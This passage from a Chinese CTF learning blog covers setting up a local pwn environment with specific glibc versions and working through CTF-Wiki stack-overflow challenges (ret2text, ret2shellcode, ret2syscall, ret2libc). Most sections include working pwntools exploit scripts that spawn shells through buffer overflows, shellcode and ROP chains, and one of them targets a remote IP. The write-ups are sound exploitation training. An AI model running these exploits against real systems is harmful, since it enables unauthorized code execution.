+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  hacknote ldd hacknote</span><br><span class="line">	linux-gate.so.1 (0xf7f14000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d0d000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f16000)</span><br><span class="line">➜  hacknote patchelf --replace-needed libc.so.6 ~/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so ./hacknote</span><br><span class="line">➜  hacknote patchelf --set-interpreter ~/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so ./hacknote           </span><br><span class="line">➜  hacknote ldd hacknote</span><br><span class="line">	linux-gate.so.1 (0xf7edb000)</span><br><span class="line">	/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so (0xf7d1e000)</span><br><span class="line">	/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7edd000)</span><br><span class="line">➜  hacknote </span><br></pre></td></tr></table></figure>
+
+<p>使用gdb调试看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220803170724167.png" alt="image-20220803170724167" style="zoom:80%;" />
+
+<p>可以看到成功实现了gdb调试的对应功能！</p>
+<p>看一下能否打通</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  hacknote objdump -d hacknote|grep magic </span><br><span class="line">08048986 &lt;magic&gt;:</span><br><span class="line">➜  hacknote </span><br></pre></td></tr></table></figure>
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>, <span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>, <span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x08048A8C&#x27;)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4s&#x27;</span>)</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220804073350332.png" alt="image-20220804073350332" style="zoom:80%;" />
+
+<p>泪目！本人太菜，搞了几天才把环境给弄好QWQ，前方的路还长，还要继续努力啊(￣︶￣*))</p>
+<h2 id="使用gcc编译不同libc版本的elf程序"><a href="#使用gcc编译不同libc版本的elf程序" class="headerlink" title="使用gcc编译不同libc版本的elf程序"></a>使用gcc编译不同libc版本的elf程序</h2><p><strong>环境：Ubuntu20</strong></p>
+<p>还是用上面的例子</p>
+<p>首先复制一下glibc库的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220804071302687.png" alt="image-20220804071302687" style="zoom:80%;" />
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  2.23-0ubuntu11.3_i386 git:(master) <span class="built_in">pwd</span></span><br><span class="line">/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386</span><br><span class="line">➜  2.23-0ubuntu11.3_i386 git:(master) ll ld*</span><br><span class="line">-rwxr-xr-x 1 vi0let vi0let 145K Jul 31 19:26 ld-2.23.so</span><br><span class="line">lrwxrwxrwx 1 vi0let vi0let   10 Jul 31 19:26 ld-linux.so.2 -&gt; ld-2.23.so</span><br><span class="line">➜  2.23-0ubuntu11.3_i386 git:(master) </span><br></pre></td></tr></table></figure>
+
+<h4 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h4><p>对于gcc修改编译程序的libc，需要知道两个约束条件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc test.c -o <span class="built_in">test</span> -Wl,--rpath=/usr/local/lib -Wl,--dynamic-linker=/usr/local/lib/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>-Wl,--rpath</code>后添加glibc动态库的路径，<code>-Wl,--dynamic-linker</code>后添加解释器的路径</p>
+<p>想要在Ubuntu20上编译指定glibc编译的程序，只需要指定上面两个路径即可</p>
+<p>回到源码的对应文件夹下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220804072336616.png" alt="image-20220804072336616" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  hacknote ls</span><br><span class="line">exp.py  flag  hacknote  hacknote.c  ld-2.23.so  libc-2.23.so  tmp</span><br><span class="line">➜  hacknote gcc -m32 -g hacknote.c -no-pie -Wl,--dynamic-linker=/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2 -Wl,--rpath=/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386 -o pwn</span><br><span class="line">➜  hacknote ls</span><br><span class="line">exp.py  flag  hacknote  hacknote.c  ld-2.23.so  libc-2.23.so  pwn  tmp</span><br><span class="line">➜  hacknote ldd pwn </span><br><span class="line">	linux-gate.so.1 (0xf7f99000)</span><br><span class="line">	libc.so.6 =&gt; /home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6 (0xf7ddc000)</span><br><span class="line">	/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0xf7f9b000)</span><br><span class="line">➜  hacknote </span><br></pre></td></tr></table></figure>
+
+<p>可以看到gcc成功指定libc编译程序</p>
+<p>使用gdb调试试试</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220804072837658.png" alt="image-20220804072837658" style="zoom:80%;" />
+
+<p>可以看到调试成功！</p>
+<p>稍微修改一下上面那道题目的本地相关的地址和程序</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; q</span><br><span class="line">➜  hacknote objdump -d pwn|grep magic</span><br><span class="line">08049684 &lt;magic&gt;:</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./hacknote&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#backdoor=0x08048986</span></span><br><span class="line">backdoor=<span class="number">0x8049684</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>, <span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>, <span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x08048A8C&#x27;)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4s&#x27;</span>)</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220804073116742.png" alt="image-20220804073116742" style="zoom:80%;" />
+
+
+
+<p>参考链接：</p>
+<p><a href="https://blog.csdn.net/mo4776/article/details/119837501">https://blog.csdn.net/mo4776/article/details/119837501</a></p>
+<p><a href="https://blog.csdn.net/jefbai/article/details/47859335">https://blog.csdn.net/jefbai/article/details/47859335</a></p>
+<h1 id="本地pwn环境搭建"><a href="#本地pwn环境搭建" class="headerlink" title="本地pwn环境搭建"></a>本地pwn环境搭建</h1><h2 id="一个比较全面介绍的博客"><a href="#一个比较全面介绍的博客" class="headerlink" title="一个比较全面介绍的博客"></a>一个比较全面介绍的博客</h2><p>hollk师傅写的一篇文章，很详细：<a href="https://blog.csdn.net/qq_41202237/article/details/118188924">https://blog.csdn.net/qq_41202237/article/details/118188924</a></p>
+<h2 id="推荐安装的一些软件、插件"><a href="#推荐安装的一些软件、插件" class="headerlink" title="推荐安装的一些软件、插件"></a>推荐安装的一些软件、插件</h2><h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><p>推荐博客：<a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a></p>
+<h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p>直接apt安装</p>
+<h3 id="zsh、oh-my-zsh"><a href="#zsh、oh-my-zsh" class="headerlink" title="zsh、oh my zsh"></a>zsh、oh my zsh</h3><p>到GitHub去找源码，推荐离线安装(GitHub在线直接安装经常挂掉)</p>
+<h3 id="待补充-…"><a href="#待补充-…" class="headerlink" title="(待补充)…"></a>(待补充)…</h3>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-Wiki之栈溢出</title>
+    <url>/2026/06/21/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>网站：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
+<p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
+<span id="more"></span>
+
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><strong>保护检查</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
+<p>32位，开启NX保护。</p>
+<p>查看调用的函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png" alt="image-20220615191201980"></p>
+<p>发现sysytem、printf、gets、puts等。</p>
+<p>ida打开看看(F5反汇编)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png" alt="image-20220615193317042"></p>
+<p>shift+f12查看字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png" alt="image-20220615193542927"></p>
+<p>很明显，在主函数中，gets函数存在栈溢出，并且字符串中调用了&#x2F;bin&#x2F;sh，追踪发现secure调用了system(“&#x2F;bin&#x2F;sh”)，记录一下地址。</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png" alt="image-20220615194305769" style="zoom:80%;" />
+
+<p>可以造成溢出的gets函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
+<p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
+<p><strong>调试</strong></p>
+<p><strong>使用gdb动态调试：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行截图如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png" alt="image-20220615202027514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png" alt="image-20220615202045907"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb动态调试计算偏移</span><br><span class="line">由图可知</span><br><span class="line">esp            0xffffcf20</span><br><span class="line">ebp            0xffffcfa8</span><br><span class="line">s=esp+1ch=ffffcf3c</span><br><span class="line">s相对于ebp偏移：offset=ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移(因为是32位，所以直接+4)：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数进行栈溢出，并且修改返回的地址</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试相关信息</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)										#远程访问，需要自己挂上去</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)							<span class="comment">#本地访问</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)								#导入本地文件</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>									<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)							<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163235776.png" alt="image-20220616163235776" style="zoom:80%;" />
+
+<p>32位，没有开启保护，说明栈上可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163318074.png" alt="image-20220616163318074" style="zoom:80%;" />
+
+<p>可以看到一些经常利用的函数，如gets…</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164235497.png" alt="image-20220616164235497" style="zoom:80%;" />
+
+<p>可以造成溢出的gets函数(因为gets没有设置字符串长度)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164317442.png" alt="image-20220616164317442" style="zoom:80%;" />
+
+<p>看主函数，可以知道当输入完s(长度为100)后，使用strncpy把s的数据复制到buf2，因为buf2没有在主函数中设出来，所以应该是一个全局变量，未初始化的全局变量一般保存在bss段中，双击buf2变量，看一下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164947894.png" alt="image-20220616164947894" style="zoom:80%;" />
+
+
+
+<p><strong>使用gdb调试看看</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode 		<span class="comment">#启动gdb</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b main			<span class="comment">#在主函数处下断点</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap			<span class="comment">#查看当前程序的系统调用库</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616165950043.png" alt="image-20220616165950043" style="zoom:80%;" />
+
+<p>由ida中的bss地址看到所属的区域(在第一行里)是具有可执行的权限的。</p>
+<p>通过主函数可以知道把s的数据复制到buf2这个可以执行的bss段上，复制的大小是0x64，0x64-0x1C&#x3D;0x48&#x3D;72，大小足够了，直接使用pwntools提供的函数即可，可以看一下pwntools中构造 shellcode的字符串长度</p>
+<p>这个是32位的shellc</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171527851.png" alt="image-20220616171527851" style="zoom:80%;" />
+
+<p>这个是64位的shellc</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171732498.png" alt="image-20220616171732498" style="zoom:80%;" />
+
+<p>对于偏移的计算，跟上面的ret2text原理一样</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode		<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x08048593	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616190029416.png" alt="image-20220616190029416" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcef0          </span><br><span class="line">ebp            0xffffcf78   </span><br><span class="line">s=esp+0x1c=ffffcf0c</span><br><span class="line">s相对于esp的偏移：ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数造成栈溢出修改返回地址为buf2的地址，在s中填充shellcode(需要填满，空余的用其他垃圾数据填充)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试的相关信息</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)					<span class="comment">#远程访问</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)						#本地访问，这题不知道为啥打不通</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2shellcode&#x27;)							#导入文件</span></span><br><span class="line"></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment">#调用系统函数自动生成</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>								<span class="comment">#buf2的地址，让返回地址修改为这个</span></span><br><span class="line"></span><br><span class="line">payload=shellc.ljust(<span class="number">0x6c</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)	<span class="comment">#构造payload</span></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程交互</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165203505.png" alt="image-20220617165203505" style="zoom:80%;" />
+
+
+
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616194848607.png" alt="image-20220616194848607" style="zoom:80%;" />
+
+<p>32位，开启了NX保护</p>
+<p>ida查看程序文件</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617102809148.png" alt="image-20220617102809148" style="zoom:80%;" />
+
+<p>看到了危险函数gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105411878.png" alt="image-20220617105411878" style="zoom:80%;" />
+
+<p>跟前面一样，动调算一下偏移值</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105536928.png" alt="image-20220617105536928" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf30         </span><br><span class="line">ebp            0xffffcfb8 </span><br><span class="line">v4---&gt;esp+0x1c=0xffffcf4c</span><br><span class="line">v4相对于ebp偏移---&gt;offset=0x6c</span><br><span class="line">因为是32位，故v4相对于返回地址的偏移---&gt;0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p>可以利用系统调用来获取shell，比较常用的是下面这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>
+
+<p>对于对应的参数，可以借鉴这个网站：<a href="https://publicki.top/old/syscall.html">https://publicki.top/old/syscall.html</a></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617112104732.png" alt="image-20220617112104732" style="zoom:80%;" />
+
+<p>使用ROPgadget查找gadgets</p>
+<p>eax的gadgets</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160518058.png" alt="image-20220617160518058" style="zoom:80%;" />
+
+<p>使用我选中的那一行可以直接对ebx、ecx、edx进行赋值</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160816757.png" alt="image-20220617160816757" style="zoom:80%;" />
+
+<p>&#x2F;bin&#x2F;sh这个字符串的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161022248.png" alt="image-20220617161022248" style="zoom:80%;" />
+
+<p>int 0x80的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161107749.png" alt="image-20220617161107749" style="zoom:80%;" />
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#之前计算的需要填充的偏移</span></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span>									<span class="comment">#eax,ret</span></span><br><span class="line">pop_e3x=<span class="number">0x0806eb90</span>									<span class="comment">#edx,ecx,ebx,ret</span></span><br><span class="line">bin_sh=<span class="number">0x080be408</span>									<span class="comment">#/bin/sh				</span></span><br><span class="line">int_0x80=<span class="number">0x08049421</span>									<span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(pop_eax)+p32(<span class="number">0x0b</span>)+p32(pop_e3x)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)										   <span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165348158.png" alt="image-20220617165348158" style="zoom:80%;" />
+
+
+
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617202842455.png" alt="image-20220617202842455" style="zoom:80%;" />
+
+<p>32位，开启NX检查</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203134019.png" alt="image-20220617203134019" style="zoom:80%;" />
+
+<p>查看调用了的一些函数，可以看到gets、system函数</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203657889.png" alt="image-20220617203657889" style="zoom: 80%;" />
+
+<p>发现可以造成溢出的gets寒素</p>
